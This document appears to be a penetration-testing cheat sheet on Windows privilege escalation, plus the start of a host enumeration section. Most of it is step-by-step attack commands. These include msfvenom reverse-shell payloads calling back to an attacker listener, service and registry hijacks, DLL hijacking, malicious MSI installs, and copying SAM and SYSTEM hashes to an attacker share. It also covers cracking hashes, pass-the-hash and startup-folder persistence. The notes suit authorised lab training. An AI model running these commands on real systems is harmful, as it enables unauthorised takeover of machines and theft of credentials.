# Privilege escalation
## Table of Contents

- [Windows Privilege Escalation](#windows-privilege-escalation)
  - [Spawning Administrator Shells](#spawning-administrator-shells)
  - [Privilege Escalation Tools](#privilege-escalation-tools)
  - [Kernel Exploits](#kernel-exploits)
  - [Service Exploits](#service-exploits)
    - [Insecure Service Properties](#insecure-service-properties)
    - [Unquoted Service Path](#unquoted-service-path)
    - [Weak Registry Permissions](#weak-registry-permissions)
    - [Insecure Service Executables](#insecure-service-executables)
    - [DLL Hijacking](#dll-hijacking)
  - [Scheduled Tasks](#scheduled-tasks)
  - [Registry](#registry)
    - [AutoRuns](#autoruns)
    - [AlwaysInstallElevated](#alwaysInstallelevated)
  - [Passwords](#passwords)
    - [Registry](#registry)
    - [Saved Creds](#saved-creds)
    - [Configuration Files](#configuration-files)
    - [SAM](#sam)
    - [Passing the Hash](#passing-the-hash)
  - [Insecure GUI Apps (Citrix Method)](#insecure-gui-apps-citrix-method)
  - [Startup Apps](#startup-apps)
  - [Installed Applications](#installed-applications)
  - [Port Forwarding](#port-forwarding)
  - [getsystem](#getsystem-named-pipes--token-duplication)
  - [User Privileges](#user-privileges)
  - [Privilege Escalation Strategy](#privilege-escalation-strategy)
- [Information Gathering](#information-gathering)
  - [Manual Enumeration](#manual-enumeration)
    - [Enumerating Users](#enumerating-users)
    - [Enumerating the Hostname](#enumerating-the-hostname)
    - [Enumerating the Operating System Version and Architecture](#enumerating-the-operating-system-version-and-architecture)
    - [Enumerating Running Processes and Services](#enumerating-running-processes-and-services)
    - [Enumerating Networking Information](#enumerating-networking-information)
    - [Enumerating Firewall Status and Rules](#enumerating-firewall-status-and-rules)
    - [Enumerating Scheduled Tasks](#enumerating-scheduled-tasks)
    - [Enumerating Installed Applications and Patch Levels](#enumerating-installed-applications-and-patch-levels) 
    - [Enumerating Readable/Writable Files and Directories](#enumerating-readablewritable-files-and-directories)
    - [Enumerating Unmounted Disks](#enumerating-unmounted-disks)
    - [Enumerating Device Drivers and Kernel Modules](#enumerating-device-drivers-and-kernel-modules)
    - [Enumerating Binaries That AutoElevate](#enumerating-binaries-that-autoelevate)
  - [Automated Enumeration](#automated-enumeration)
- [Windows Privilege Escalation Examples](#windows-privilege-escalation-examples)
  - [Understanding Windows Privileges and Integrity Levels](#understanding-windows-privileges-and-integrity-levels)
  - [Introduction to User Account Control (UAC)](#introduction-to-user-account-control-uac)
  - [User Account Control (UAC) Bypass: fodhelper.exe Case Study](#user-account-control-uac-bypass-fodhelperexe-case-study)
  - [EventViewer-UACBypass](#eventviewer-uacbypass)
  - [Insecure File Permissions: Serviio Case Study](#insecure-file-permissions-serviio-case-study)
  - [Leveraging Unquoted Service Paths](#leveraging-unquoted-service-paths)
  - [Windows Kernel Vulnerabilities: USBPcap Case Study](#windows-kernel-vulnerabilities-usbpcap-case-study)
  - [Token Impersonation - Service Accounts](#token-impersonation---service-accounts)  
    - [Juicy Potato](#juicy-potato)
    - [Rogue Potato](#rogue-potato)
    - [Sweet Potato](#sweet-potato)
    - [PrintSpoofer](#printspoofer)
- [Linux Privilege Escalation Examples](#linux-privilege-escalation-examples)
  - [Insecure File Permissions: Cron Case Study](#insecure-file-permissions-cron-case-study)
  - [Insecure File Permissions](#insecure-file-permissions)
  - [Kernel Vulnerabilities: CVE-2017-1000112 Case Study](#kernel-vulnerabilities-cve-2017-1000112-case-study)
    - [Compiling C/C++ Code on Linux](#compiling-cc-code-on-linux) 
    - [Compiling on Kali](#compiling-on-kali)
  - [Privilege Escalation with SUID files](#privilege-escalation-with-suid-files)
  - [NFS misconfigurations](#nfs-misconfigurations)
  - [Service Exploits](#service-exploits)
    - [MySQL Case Study](#mysql-case-study)
    - [Port Forwarding](#port-forwarding)

## Windows Privilege Escalation
### Spawning Administrator Shells
- msfvenom: If we can execute commands with admin privileges, a reverse shell generated by msfvenom works nicely:
    ```sh
    # msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f exe -o reverse.exe 
    ```
- **RDP**: Alternatively, if RDP is available (or we can enable it), we can add our low privileged user to the administrators group and then spawn an administrator command prompt via the GUI.
    ```powershell
    > net localgroup administrators <username> /add
    ```
- **Admin -> SYSTEM**: To escalate from an admin user to full SYSTEM privileges, you can use the PsExec tool from Windows Sysinternals
    ```powershell
    > .\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe
    ```
> **Note**:
> This is usually more stable than using impacket-psexec directly!
### Privilege Escalation Tools
The foremost tools are (in order):
- [WinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS). Already installed on Kali in `/usr/share/peass/winpeas/winPEASany.exe`.
    ```powershell
    .\winPEASany.exe quiet cmd fast                       # Run all checks avoiding time-consuming searches.
    .\winPEASany.exe quiet cmd systeminfo                 # Run specific check categories.
    ```
- [Seatbelt](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)
    ```powershell
    .\Seatbelt.exe all
    ```
- [accesschk.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk). Old but still trustworthy tool for checking user access control rights. You can use it to check whether a user or group has access to files, directories, services, and registry keys.
- [PsExec64.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec). Useful for lateral movement and to escalate from an admin user to full SYSTEM privileges.
    ```powershell
    .\PsExec64.exe -accepteula -i -s C:\rev.exe
    ```
> **Note**:
> The SysInternals tools are installed under `/usr/share/windows-resources/sysinternals`.
### Kernel Exploits
Tools
- Windows Exploit Suggester: https://github.com/bitsadmin/wesng
- Precompiled Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits
- Watson: https://github.com/rasta-mouse/Watson

Privilege Escalation (Note: These steps are for Windows 7)
1. Extract the output of the systeminfo command:
    ```cmd
    > systeminfo > systeminfo.txt
    ```
2. Run wesng to find potential exploits:
    ```sh
    # python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
    ```
3. Cross-reference results with compiled exploits: https://github.com/SecWiki/windows-kernel-exploits
4. Download the compiled exploit for CVE-2018-8210 onto the Windows VM: https://github.com/SecWiki/windowskernel-exploits/blob/master/CVE-2018-8120/x64.exe
5. Start a listener on Kali and run the exploit, providing it with the reverse shell executable, which should run with
SYSTEM privileges:
    ```cmd
    > .\x64.exe C:\PrivEsc\reverse.exe
    ```
### Service Exploits
Services are simply programs that run in the background, accepting input or performing regular tasks. If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command execution with SYSTEM privileges as well.

```powershell
sc.exe qc <name>                                # Query the configuration of a service.
sc.exe query <name>                             # Query the current status of a service.
sc.exe config <name> <option>= <value>          # Modify the configuration option of a service.
sc.exe start/stop <name>                        # Start/Stop a service.
```
#### Insecure Service Properties
Each service has an ACL which defines certain service specific permissions.
- Some permissions are innocuous (eg `SERVICE_QUERY_CONFIG`, `SERVICE_QUERY_STATUS`)
- Some may be useful (eg `SERVICE_STOP`, `SERVICE_START`)
- Some permissions are dangerous (eg `SERVICE_CHANGE_CONFIG`, `SERVICE_ALL_ACCESS`)

If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.

> **Potential Rabbit Hole**:
> If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!

1. use winPEAS to check for service misconfigurations
    ```powershell
    .\winPEASany.exe quiet servicesinfo
    ```
2. If there is a service that we can modify, comfirm this with accessChk.exe:
    ```powershell
    .\accessChk.exe /accepteula -uwcqv user <service_name>
    ```
3. Check the current configuration and status of the service.
    ```powershell
    sc qc <service_name>
    sc query <service_name>
    ```
4. Reconfigure the service to use our reverse shell executable.
    ```powershell
    sc qconfig <service_name> binpath="\"C:\rev.exe\""
    ```
5. Start listener on Kali, and then start the service to trigger the exploit.
#### Unquoted Service Path
See [Leveraging Unquoted Service Path](#leveraging-unquoted-service-paths).
#### Weak Registry Permissions
The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service‚Äôs configuration even if we cannot modify the service directly.
1. Run winPEAS to check for service misconfigurations:
    ```powershell
    > .\winPEASany.exe quiet servicesinfo
    ```
2. Note that the "regsvc" service has a weak registry entry. We can confirm this with PowerShell:
    ```powershell 
    PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
    ```
3. Alternatively `accesschk.exe` can be used to confirm:
    ```powershell
    > .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
    ```
4. Overwrite the **ImagePath** registry key to point to our reverse shell executable:
    ```powershell
    > reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
    ```
5. Start a listener on Kali, and then start the service to trigger the exploit:

#### Insecure Service Executables
If the original executable is modifiable by our user, we can simply replace it with our reverse shell executable. Remember ato create a backup of the original executable. To execute the replaced binary, restart the service or, in case the service is configured to start automatically, reboot the machine.

Check out [Insecure File Permissions: Serviio Case Study](#insecure-file-permissions-serviio-case-study)

1. Get a list of all installed Windows services:
    ```powershell
    Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

    Name                      State   PathName
    ----                      -----   --------
    Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
    mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
    ...
    ```
2. let's enumerate the permissions on both service binaries. We can choose between the traditional icacls Windows utility or the PowerShell Cmdlet Get-ACL.
    ```powershell
    PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
    C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                                  NT AUTHORITY\SYSTEM:(F)
                                  BUILTIN\Users:(RX)                                  
                                  NT AUTHORITY\Authenticated Users:(RX)
    PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
    C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                                  BUILTIN\Administrators:(F)
                                  BUILTIN\Users:(F)                                   !!!
    ```
Alternatively we can do this using winPEAS:
1. use winPEAS to check for service misconfigurations
    ```powershell
    .\winPEASany.exe quiet servicesinfo
    ```
2. If there is a service that has an executable writable by everyone, check this using accessChk.exe:
    ```powershell
    .\accessChk.exe /accepteula -quvw <service_exe>
    ```
3. Create a backup of the original service executable.
4. Replace the service executable with a reverse shell executable.
5. Start listener on Kali, and then start the service to trigger the exploit.
#### DLL Hijacking
Often a service will try to load functionality from a library called a DLL (dynamic-link library). Whatever functionality the DLL provides, will be executed with the same privileges as the service that loaded it.
If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.

A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searches for DLLs in.
Unfortunately, initial detection of vulnerable services is difficult, and often the entire process is very manual.

1. Use winPEAS to enumerate non-Windows services:
    ```powershell
    > .\winPEASany.exe quiet servicesinfo
    ```
2. Note that the C:\Temp directory is writable and in the PATH. Start by enumerating which of these services our user has stop and start access to:
    ```powershell
    > .\accesschk.exe /accepteula -uvqc user <svc_name>
    ```
3. The `<svc_name>` service is vulnerable to DLL Hijacking. According to the winPEAS output, the service runs the `<svc_exe>` executable. We can confirm this manually:
    ```powershell
    > sc qc <svc_name>
    ```
4. Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu.
5. Add a new filter on the Process Name matching `<svc_exe>`.
6. On the main screen, deselect registry activity and network activity.
7. Start the service:
    ```powershell
    > net start <svc_name>
    ```
8. Back in Procmon, note that a number of `NAME NOT FOUND` errors appear, associated with the <hijackame_dll> file.
9. At some point, Windows tries to find the file in a directory writable by our user.
10. On Kali, generate a reverse shell DLL named <hijackame_dll>:
    ```sh
    # msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o hijackme.dll
    ```
11. Copy the DLL to the Windows VM and into the writable directory. Start a listener on Kali and then stop/start the service to trigger the exploit:
    ```
    > net stop <svc_name>
    > net start <svc_name>
    ```
### Scheduled Tasks
Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event (e.g. a user logon).
Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM.

Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account.
List all scheduled tasks your user can see:
```cmd
> schtasks /query /fo LIST /v

PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run. If we find one of those we can use accesChk to check our privileges on the script:
```powershell
accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```
### Registry
#### AutoRuns
Windows can be configured to run commands at startup, with elevated privileges. These "AutoRuns" are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.
##### Privilege Escalation
1. Use winPEAS to check for writable AutoRun executables:
    ```powershell
    > .\winPEASany.exe quiet applicationsinfo
    ```
2. Alternatively, we could manually enumerate the AutoRun executables:
    ```powershell
    > reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    ```
    and then use accesschk.exe to verify the permissions on each one:
    ```powershell
    > .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
    ```
3. The "C:\Program Files\Autorun Program\program.exe" AutoRun executable is writable by Everyone. Create a backup of the original:
    ```powershell
    > copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
    ```
4. Copy our reverse shell executable to overwrite the AutoRun executable:
    ```powershell
    > copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
    ```
5. Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on Windows 10, the exploit appears to run with the privileges of the last logged on user, so log out of the "user" account and log in as the "admin" account first.   
#### AlwaysInstallElevated
MSI files are package files used to install applications. These files run with the permissions of the user trying to install them.
Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.

The catch is that two Registry settings must be enabled for this to work. The "AlwaysInstallElevated" value must be set to 1 for both:
- the local machine: `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
- and the current user: `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
If either of these are missing or disabled, the exploit will not work.
##### Privilege Escalation
1. Use winPEAS to see if both registry values are set:
    ```powershell
    > .\winPEASany.exe quiet windowscreds
    ```
2. Alternatively, verify the values manually:
    ```powershell
    > reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    > reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
3. Create a new reverse shell with msfvenom, this time using the msi format, and save it with the **.msi** extension:
    ```sh
    # msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
4. Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:
    ```powershell
    > msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
    ```
### Passwords
Administrators re-use their passwords, or leave their passwords on systems in readable locations.
Windows can be especially vulnerable to this, as several features of Windows store passwords insecurely.
#### Registry
Plenty of programs store configuration options in the Windows Registry. Windows itself sometimes will store passwords in plaintext in the Registry. It is always worth searching the Registry for passwords.
-  search the registry for keys and values that contain "password"
    ```powershell
    > reg query HKLM /f password /t REG_SZ /s
    > reg query HKCU /f password /t REG_SZ /s
    ```
    This usually generates a lot of results, so often it is more fruitful to look in known locations.
##### Privilege Escalation
1. Use winPEAS to check common password locations:
    ```powershell
    > .\winPEASany.exe quiet filesinfo userinfo
    ```
2. The results show both AutoLogon credentials and Putty session credentials for the admin user (admin/password123).
3. We can verify these manually:
    ```powershell
    > reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
    > reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
    ```
4. On Kali, we can use the winexe command to spawn a shell using these credentials:
    ```sh
    # winexe -U 'admin%password123' //192.168.1.22 cmd.exe
    ```
#### Saved Creds
Windows has a runas command which allows users to run commands with the privileges of other users. This usually requires the knowledge of the other user‚Äôs password.
However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.
##### Privilege Escalation
1. Use winPEAS to check for saved credentials:
    ```powershell
    > .\winPEASany.exe quiet cmd windowscreds
    ```
2. It appears that saved credentials for the admin user exist.
3. We can verify this manually using the following command:
    ```powershell
    > cmdkey /list
    ```
4. If the saved credentials aren‚Äôt present, run the following script to refresh the credential:
    ```powershell
    > C:\PrivEsc\savecred.bat
    ```
5. We can use the saved credential to run any command as the admin user. Start a listener on Kali and run the reverse shell executable:
    ```powershell
    > runas /savecred /user:admin C:\PrivEsc\reverse.exe
    ```
#### Configuration Files
Some administrators will leave configurations files on the system with passwords in them. The **Unattend.xml** file is an example of this. It allows for the largely automated setup of Windows systems.
- Recursively search for files in the current directory with "pass" in the name, or ending in ".config":
    ```powershell
    > dir /s *pass* == *.config
    ```
- Recursively search for files in the current directory that contain the word "password" and also end in either .xml, .ini, or .txt:
    ```powershell
    > findstr /si password *.xml *.ini *.txt
    ```
##### Privilege Escalation
1. Use winPEAS to search for common files which may contain credentials:
    ```powershell
    > .\winPEASany.exe quiet cmd searchfast filesinfo
    ```
2. The Unattend.xml file was found. View the contents:
    ```powershell
    > type C:\Windows\Panther\Unattend.xml
    ```
3. A password for the admin user was found. The password is Base64 encoded: `cGFzc3dvcmQxMjM=`
4. On Kali we can easily decode this:
    ```sh
    # echo "cGFzc3dvcmQxMjM=" | base64 -d
    ```
5. Once again we can simply use winexe to spawn a shell as the admin user
### SAM
Windows stores password hashes in the **Security Account Manager** (SAM). The hashes are encrypted with a key which can be found in a file named SYSTEM. If you have the ability to read the SAM and SYSTEM files, you can extract the hashes.

The SAM and SYSTEM files are located in the **C:\Windows\System32\config** directory. The files are locked while Windows is running. Backups of the files may exist in the **C:\Windows\Repair** or **C:\Windows\System32\config\RegBack** directories. 

> **Note**:
> If you find any non usual directory (eg Windows.old) associated to Windows system files analyse it to see if it contains any SAM or SYSTEM file.

##### Privilege Escalation
1. Backups of the SAM and SYSTEM files can be found in C:\Windows\Repair and are readable by our user.
2. Copy the files back to Kali:
    ```powershell
    > copy C:\Windows\Repair\SAM \\192.168.1.11\tools\
    > copy C:\Windows\Repair\SYSTEM \\192.168.1.11\tools\
    ```
3. Download the latest version of the creddump suite:
    ```sh
    # git clone https://github.com/Neohapsis/creddump7.git
    ```
4. Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
    ```sh
    # python2 creddump7/pwdump.py SYSTEM SAM
    ```
5. Crack the admin user hash using hashcat:
    ```sh
    # hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
    ```
> **Note**:
> In alternative follow the instructions on [Dumping Hashes from SAM via Registry](https://gist.github.com/A-Pisani/a79808e058ccc49bcf71921a05d51f80#dumping-hashes-from-sam-via-registry) from point 2 on.
#### Passing the Hash
Windows accepts hashes instead of passwords to authenticate to a number of services.
We can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin user‚Äôs hash.
##### Privilege Escalation
1. Extract the admin hash from the SAM in the previous step.
2. Use the hash with pth-winexe to spawn a command prompt:
    ```sh
    # pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
    ```
3. Use the hash with pth-winexe to spawn a SYSTEM level command prompt:
    ```sh
    # pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
    ```
### Insecure GUI Apps (Citrix Method)
On some (older) versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges.
There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality.
Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges.

1. Log into the Windows VM using the GUI with the ‚Äúuser‚Äù account.
2. Double click on the ‚ÄúAdminPaint‚Äù shortcut on the Desktop.
3. Open a command prompt and run:
    ```powershell
    > tasklist /V | findstr mspaint.exe
    ```
Note that `mspaint.exe` is running with admin privileges.
4. In Paint, click "File", then "Open". In the navigation input, replace the contents with: `file://c:/windows/system32/cmd.exe`
5. Press "Enter". A command prompt should open running with admin privileges.
### Startup Apps
Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory.
Windows also has a startup directory for apps that should start for all users: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.

Note that shortcut files (**.lnk**) must be used. The following VBScript can be used to create a shortcut file:
```vbscript
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

1. Use accesschk.exe to check permissions on the StartUp directory:
    ```powershell
    > .\accesschk.exe /accepteula -d
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    ```
2. Note that the `BUILTIN\Users` group has write access to this directory.
3. Create a file `CreateShortcut.vbs` with the VBScript provided . Change file paths if necessary.
4. Run the script using cscript:
    ```powershell
    > cscript CreateShortcut.vbs
    ```
5. Start a listener on Kali, then log in as the admin user to trigger the exploit.
### Installed Applications
- Manually enumerate all running programs:
    ```
    tasklist /v
    .\seatbelt.exe NonStandardProcesses
    .\winPEASany.exe quiet procesinfo
    ```
Once you find an interesting process try to identify its version. You can try running the executable with `/?` or `-h`, as well as checking config or text files in the Program Files directory. Then use Exploit-DB to search for a corresponding exploit. 
### Port Forwarding
Sometimes it is easier to run exploit code on Kali, but the vulnerable program is listening on an internal port.
In these cases we need to forward a port on Kali to the internal port on Windows. We can do this using a program called **plink.exe** (from the makers of PuTTY).
```powershell
> plink.exe <user>@<kali> -R <kaliport>:<target-IP>:<target-port>
> plink.exe kali@<kali-IP> -R <kaliport>:<target-IP>:<target-port>
```
Note that the <target-IP> is usually local (e.g. 127.0.0.1). plink.exe requires you to SSH to Kali, and then uses the SSH tunnel to forward ports
#### Privilege Escalation
1. Copy the plink.exe file across to Windows.
2. Make sure that the SSH server on Kali is running and accepting root logins. Check that the "PermitRootLogin yes" option is uncommented in `/etc/ssh/sshd_config`. Restart the SSH service if necessary.
3. On Windows, use plink.exe to forward port 445 on Kali to the Windows port 445:
    ```powershell
    > plink.exe root@192.168.1.11 -R 445:127.0.0.1:445
    ```
4. On Kali, use the winexe command to point to localhost (or 127.0.0.1), and execute it to get a shell via the port forward:
    ```sh
    # winexe -U 'admin%password123' //localhost cmd.exe
    ```
### getsystem (Named Pipes & Token Duplication)
#### Access Tokens
Access Tokens are special objects in Windows which store a user‚Äôsidentity and privileges.
- **Primary Access Token** ‚Äì Created when the user logs in, bound to the current user session. When a user starts a new process, their primary access token is copied and attached to the new process.
- **Impersonation Access Token** ‚Äì Created when a process or thread needs to temporarily run with the security context of another user.
#### Token Duplication
Windows allows processes/threads to duplicate their access tokens. An impersonation access token can be duplicated into a primary access token this way. If we can inject into a process, we can use this functionality to duplicate the access token of the process, and spawn a separate process with the same privileges.
#### Named Pipes
You may be already familiar with the concept of a ‚Äúpipe‚Äù in Windows & Linux:
```
> systeminfo | findstr Windows
```
A named pipe is an extension of this concept. A process can create a named pipe, and other processes can open the named pipe to read or write data from/to it. The process which created the named pipe can impersonate the security context of a process which connects to the named pipe.
#### getsystem
The "getsystem" command in Metasploit‚Äôs Meterpreter shell has an almost mythical status. By running this simple command, our privileges are almost magically elevated to that of the SYSTEM user. What does it actually do?

The source code for the getsystem command can be found [here](https://github.com/rapid7/metasploitpayloads/tree/d672097e9989e0b4caecfad08ca9debc8e50bb
0c/c/meterpreter/source/extensions/priv). Three files are worth looking through: elevate.c, namedpipe.c, and tokendup.c.
There are 3 techniques getsystem can use to ‚Äúget system‚Äù:
1. **Named Pipe Impersonation (In Memory/Admin)**: Creates a named pipe controlled by Meterpreter. Creates a service (running as SYSTEM) which runs a command that interacts directly with the named pipe. Meterpreter then impersonates the connected process to get an
impersonation access token (with the SYSTEM security context). The access token is then assigned to all subsequent Meterpreter threads, meaning they run with SYSTEM privileges.
2. **Named Pipe Impersonation (Dropper/Admin)**: Very similar to Named Pipe Impersonation (In Memory/Admin). Only difference is a DLL is written to disk, and a service created which runs the DLL as SYSTEM. The DLL connects to the named pipe. 
3. **Token Duplication (In Memory/Admin)**: This technique requires the "SeDebugPrivilege". It finds a service running as SYSTEM which it injects a DLL into. The DLL duplicates the access token of the service and assigns it to Meterpreter. Currently this only works on x86 architectures. This is the only technique that does not have to create a service, and operates entirely in memory
### User Privileges
In Windows, user accounts and groups can be assigned specific "privileges". These privileges grant access to certain abilities. Some of these abilities can be used to escalate our overall privileges to that of SYSTEM.
Highly detailed paper: https://github.com/hatRiot/token-priv.

- **SeImpersonatePrivilege**: The SeImpersonatePrivilege grants the ability to impersonate any access tokens which it can obtain. If an access token from a SYSTEM process can be obtained, then a new process can be spawned using that token. The Juicy Potato exploit in a previous section abuses this
ability.
- **SeAssignPrimaryPrivilege**: The SeAssignPrimaryPrivilege is similar to SeImpersonatePrivilege. It enables a user to assign an access token to a new process. Again, this can be exploited with the Juicy Potato exploit
- **SeBackupPrivilege**: The SeBackupPrivilege grants read access to all objects on the system, regardless of their ACL. Using this privilege, a user could gain access to sensitive files, or extract hashes from the registry which could then be cracked or used in a pass-the-hash attack.
- **SeRestorePrivilege**: The SeRestorePrivilege grants write access to all objects on the system, regardless of their ACL. There are a multitude of ways to abuse this privilege:
  - Modify service binaries.
  - Overwrite DLLs used by SYSTEM processes
  - Modify registry settings.
- **SeTakeOwnershipPrivilege**: The SeTakeOwnershipPrivilege lets the user take ownership over an object (the WRITE_OWNER permission). Once you own an object, you can modify its ACL and grant yourself write access. The same methods used with SeRestorePrivilege then apply.
- **Other Privileges (More Advanced)**:
  - SeTcbPrivilege
  - SeCreateTokenPrivilege
  - SeLoadDriverPrivilege
  - SeDebugPrivilege (used by getsystem)
### Privilege Escalation Strategy
Enumeration
1. Check your user (`whoami`) and groups (`net user <username>`)
2. Run winPEAS with fast, searchfast, and cmd options.
3. Run Seatbelt & other scripts as well!
4. If your scripts are failing and you don‚Äôt know why, you can always run the manual commands from this course, and other Windows PrivEsc cheatsheets online (e.g. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

- Spend some time and read over the results of your enumeration.
- If WinPEAS or another tool finds something interesting, make a note of it.
- Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work.
- Have a quick look around for files in your user‚Äôs desktop and other common locations (e.g. `C:\` and `C:\Program Files`).
- Read through interesting files that you find, as they may contain useful information that could help escalate privileges.
- Try things that don‚Äôt have many steps first, e.g. registry exploits, services, etc.
- Have a good look at admin processes, enumerate their versions and search for exploits.
- Check for internal ports that you might be able to forward to your attacking machine.
- If you still don‚Äôt have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd.
  - This might be a process or file name you aren‚Äôt familiar with or even a username.
- At this stage you can also start to think about Kernel Exploits.
## Information Gathering
### Manual Enumeration
#### Enumerating Users
- Windows: 
    ```cmd
    C:\Users\student>whoami                         REM Getting information about current user.
    client251\student
    
    C:\Users\student>net user student               REM Getting information about current user.
    C:\Users\student>net user                       REM Getting information about current users.
    ```
- Linux: 
    ```sh
    student@debian:~$ id                                          # Getting information about current user.
    student@debian:~$ cat /etc/passwd                             # Getting information about users.
    student@debian:~$ grep -vE "nologin|false" /etc/passwd        # Getting information about users who have a shell.
    ```
üí•üí• In *nix look for unusual users (UID > 1000).  
üí•üí• Can we SSH using non "default" users? Check the file `/etc/ssh/sshd_config`) to bruteforce the password.
#### Enumerating the Hostname
A machine's hostname can often provide clues about its functional roles. More often than not, the hostnames will include identifiable abbreviations such as **`web`** for a web server, **`db`** for a database server, **`dc`** for a domain controller, etc.

We can discover the hostname with the **`hostname`** command, which is installed on both Windows and Linux.

#### Enumerating the Operating System Version and Architecture
- Windows: Getting the version and architecture of the running operating system
    ```cmd
    C:\Users\student>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
    ```
- Linux: Getting the version of the running operating system and architecture
    ```sh
    student@debian:~$ cat /etc/issue

    student@debian:~$ cat /etc/*-release

    student@debian:~$ uname -a
    ```
#### Enumerating Running Processes and Services
- Windows: Getting a list of running processes on the operating system and matching services.
    ```cmd
    C:\Users\student>tasklist /SVC
    ```
- Linux: we can list system processes (including those run by privileged users) with the **`ps`** command. 
    ```sh
    student@debian:~$ ps axu
    ```
#### Enumerating Networking Information
- The next step in our analysis of the target host is to review available network interfaces, routes, and open ports.
- This information can help us determine if the compromised target is connected to multiple networks and therefore could be used as a pivot. 
- In addition, the presence of specific virtual interfaces may indicate the existence of virtualization or antivirus software.
- If the machine does have multiple network interfaces => take a closer look at its routing tables.

- Windows: 
    ```cmd
    C:\Users\student>ipconfig /all                  REM Listing the full TCP/IP configuration on all available adapters
    C:\Users\student>route print                    REM Printing the routes
    C:\Users\student>netstat -ano                   REM Listing all active network connections
    ```
- Linux: 
    ```sh
    student@debian:~$ ip a                          # Listing the full TCP/IP configuration on all available adapters
    student@debian:~$ /sbin/route                   # Printing the routes
    student@debian:~$ ss -anp                       # Listing all active network connections
    ```
üí• If there is a service listed that wasn't detected using Nmap, it's a good sign there's a firewall rule blocking it.
üí• Some services (eg. MySQL, TCP 3306) use the loopback interface (127.0.0.1).
#### Enumerating Firewall Status and Rules
